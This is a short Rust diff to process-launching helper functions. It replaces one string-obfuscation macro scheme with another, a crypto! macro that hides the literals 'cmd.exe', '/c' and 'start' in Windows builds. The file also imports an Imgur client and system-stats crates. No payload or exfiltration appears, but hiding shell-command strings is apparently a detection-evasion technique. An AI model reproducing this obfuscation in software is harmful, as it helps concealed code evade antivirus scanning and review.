@@ -1,5 +1,7 @@
 extern crate systemstat;
 
+#[cfg(target_os = "windows")]
+use crate::crypto;
 use anyhow::anyhow;
 use anyhow::Context;
 use std::fs;
@@ -9,10 +11,6 @@ use std::io::Cursor;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 use std::process::Command;
-#[cfg(target_os = "windows")]
-use wpkg_crypto::decode;
-#[cfg(target_os = "windows")]
-use wpkg_macro::encode;
 
 use imgurs::ImgurClient;
 use rand::prelude::*;
@@ -51,10 +49,10 @@ pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()>
 
     #[cfg(target_os = "windows")]
     {
-        full_command.push(decode(encode!("cmd.exe")));
-        full_command.push(decode(encode!("/c")));
+        full_command.push(crypto!("cmd.exe"));
+        full_command.push(crypto!("/c"));
         if !wait {
-            full_command.push(decode(encode!("start")));
+            full_command.push(crypto!("start"));
         }
     }
 
@@ -88,10 +86,10 @@ pub fn run_process_with_work_dir(
 
     #[cfg(target_os = "windows")]
     {
-        full_command.push(decode(encode!("cmd.exe")));
-        full_command.push(decode(encode!("/c")));
+        full_command.push(crypto!("cmd.exe"));
+        full_command.push(crypto!("/c"));
         if !wait {
-            full_command.push(decode(encode!("start")));
+            full_command.push(crypto!("start"));
         }
     }
 
